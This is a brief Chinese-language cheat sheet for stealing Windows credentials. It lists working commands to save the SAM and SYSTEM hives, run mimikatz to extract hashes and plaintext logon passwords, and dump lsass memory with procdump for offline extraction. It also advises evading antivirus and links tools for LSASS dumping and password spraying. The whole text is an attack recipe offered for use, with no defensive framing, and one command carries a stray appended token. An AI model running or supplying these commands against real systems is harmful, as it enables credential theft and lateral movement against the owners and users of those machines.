

## Windows Server 2003、Windows Server 2008、Windows 7 获取到明文密码

首先我们需要把当前系统注册表 SAM、SYSTEM 获取到
reg save HKLM\SYSTEM Sys.hiv

reg save HKLM\SAM Sam.hiv

mimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exitsaulGoodman


然后把这两个文件拖回本地然后用 mimikatz 抓取密码hash


mimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exit

把mimikatz拖到目标主机获取密码（根据实际需要，mimikatz需要免杀）

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"

通过 Procdump 获取 lsass 抓内存中的明文密码

通过procdump下载lsass信息

procdump.exe -accepteula -ma lsass.exe lsass.dmp



回传本地获取密码
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit

## LSASS 转储

   远程凭据提取：https://github.com/fortra/nanodump
   
   impacket包 ，也有windows的版本，查看我的其他项目，上传了。

## 解密码项目

  https://github.com/seventeenman/CallBackDump
  
  
## 密码喷洒

  https://github.com/Porchetta-Industries/CrackMapExec/releases/tag/v5.4.0
